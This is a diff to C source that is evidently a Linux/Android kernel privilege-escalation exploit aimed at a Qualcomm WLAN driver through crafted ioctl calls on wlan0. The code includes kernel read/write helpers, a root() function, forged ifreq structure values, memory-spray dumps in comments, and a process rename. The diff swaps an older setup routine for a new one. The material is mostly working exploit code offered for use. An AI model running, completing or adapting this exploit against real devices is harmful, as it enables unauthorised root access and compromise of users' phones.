@@ -11,8 +11,8 @@
 #include <sys/mman.h>
 #include <linux/kernel.h>
 #include <net/if.h>
-#include "structs.h"
-#include "wlan_hdd_packet_filtering.h"
+//#include "structs.h"
+//#include "wlan_hdd_packet_filtering.h"
 
 
 int write_kernel(void* kernel_addr, void* process_addr, int size){
@@ -123,7 +123,7 @@ int prepare(){
 	void* map_addr2; 
 	char data[1024] = {0};
 	struct ifreq req;
-	struct tPacketFilterCfg cfg;
+	//struct tPacketFilterCfg cfg;
 	unsigned long int tmp;
 	
 	//sub_443C10(1, 2, NULL);
@@ -140,14 +140,9 @@ int prepare(){
 	printf("req.ifr_ifru.ifru_data=%ld\n", sizeof(req.ifr_ifru.ifru_data));
 	printf("req.ifr_ifru.ifru_settings=%ld\n", sizeof(req.ifr_ifru.ifru_settings));
 	
-	printf("cfg=%ld\n", sizeof(cfg));
+	//printf("cfg=%ld\n", sizeof(cfg));
 	
-	memset(&req, 0, sizeof(req));
-	strcpy(req.ifr_name, "wlan0");
-	req.ifr_ifru.ifru_data = &cfg;
 	
-	*((unsigned long int*)(&req) + 3) = 0x0000000000001000UL;
-	*((unsigned long int*)(&req) + 4) = 0x0000000000000480;
 	
 	
 	/*
@@ -171,8 +166,6 @@ int prepare(){
 0x7fffffe290:   0x5c13370058133700      0x6413370060133700
 0x7fffffe2a0:   0x6c13370068133700
 
-
-
 0x040001
 0x00 00 00 00 00~~~~~~	0x0413370000414141	0x~~13370008133700
 0x0c~~~~~~~~~~~~~~	0x1413370010 00 37 00	0x 1c13370018 133700	0x~~~~~~~~~~133700
@@ -180,6 +173,13 @@ int prepare(){
 0x34~~~~~~~~~~~~~~	0x3c13370038 d4 37 00	0x4413370040 133700	0x~~~~~~~~~~133700
 0x4c 13 37 00 48~~~~~~	0x54 13370050133700	0x~~13370058133700
 	*/
+/*
+	memset(&req, 0, sizeof(req));
+	strcpy(req.ifr_name, "wlan0");
+	req.ifr_ifru.ifru_data = &cfg;
+	
+	*((unsigned long int*)(&req) + 3) = 0x0000000000001000UL;
+	*((unsigned long int*)(&req) + 4) = 0x0000000000000480;
 	
 	#define assign_chrs(dst, variable, value) variable=value; memcpy(dst, &variable, sizeof(variable));
 	
@@ -247,8 +247,32 @@ int prepare(){
 	printf("[++] ioctl wlan0 ret=%d\n", ret);
 	
 	prctl(PR_SET_NAME, "n14PwfvAq8");
-	
+*/
 	return 0;
+}
+
+void prepare2(){
+	int fd ;
+	struct ifreq req;
+	char data[32]={0};//sp+0x3470
+	char data2[0x1000] = {0};//sp+0x2470
+	
+	fd = socket(2, 1, 0);
+	
+	printf("req=%ld\n", sizeof(req));//40
+	printf("req.ifr_name=%ld\n", sizeof(req.ifr_name));//16
+	printf("req.ifr_ifru=%ld\n", sizeof(req.ifr_ifru));//24
+	printf("req.ifr_ifru.ifru_addr=%ld\n", sizeof(req.ifr_ifru.ifru_addr));//16
+	printf("req.ifr_ifru.ifru_map=%ld\n", sizeof(req.ifr_ifru.ifru_map));//24
+	printf("req.ifr_ifru.ifru_data=%ld\n", sizeof(req.ifr_ifru.ifru_data));//8
+	printf("req.ifr_ifru.ifru_settings=%ld\n", sizeof(req.ifr_ifru.ifru_settings));//16
+	
+	*((unsigned long int*)data) = 0;
+	*((unsigned long int*)data + 1) = 0;
+	*((unsigned long int*)data + 2) = 0;
+	*((unsigned long int*)data + 3) = 0;
+	
+	memset(data2, 0, 0x1000);
 }
 
 void root(){
@@ -256,12 +280,14 @@ void root(){
 	char* kernel_data = NULL;
 	int size = -1;
 	
-	prepare();
+	//prepare();
+	prepare2();
 	
 	kernel_data = (char*)malloc(0x4000);
-	size = kernel_read(addr, kernel_data, 0x4000);
+	printf("[+] kernel_data=%p\n", kernel_data);
 	
-	printf("size=%d\n", size);
+	size = kernel_read(addr, kernel_data, 0x4000);
+	printf("[+] size=%d\n", size);
 }
 
 int main(int argc, char* argv[]){
